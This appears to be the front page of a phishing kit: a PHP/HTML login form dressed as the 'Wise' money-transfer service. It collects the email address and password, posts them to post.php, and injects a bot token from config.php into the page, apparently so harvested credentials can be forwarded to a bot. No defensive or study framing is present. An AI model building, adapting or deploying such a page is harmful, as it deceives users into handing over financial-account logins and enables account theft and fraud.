<?php
include("config.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/css/wise.css">
<title>wise</title>
</head>
<body>
<header>
<img src="res/img/logo.png">
</header>
<script>var token=<?php echo json_encode($bot); ?>;</script>

<main>
<div class="page">

<div class="wel">
<h1> Welcome back.</h1>
</div>
<div class="wel">
<h5>New to Wise? <a href>Sign up</a></h5>
</div>


<form action="post.php" method="post" style="margin-top:50px;">
<div class="col">
<div class="col">Your email address</div>
<input type="text" name="user" required>
</div>

<div class="col">
<div class="col"> Your password</div>
<input type="password" name="pass" required>
</div>

<div class="colo">
<button type="sumbit">Log in</button>
</div>
</form>

<div class="col1">
<div class="top">
<a href="">Trouble logging in?</a></div>



</div>



</div>
</main>



<script src="./res/jq.js"></script>
 
 
</body>
</html>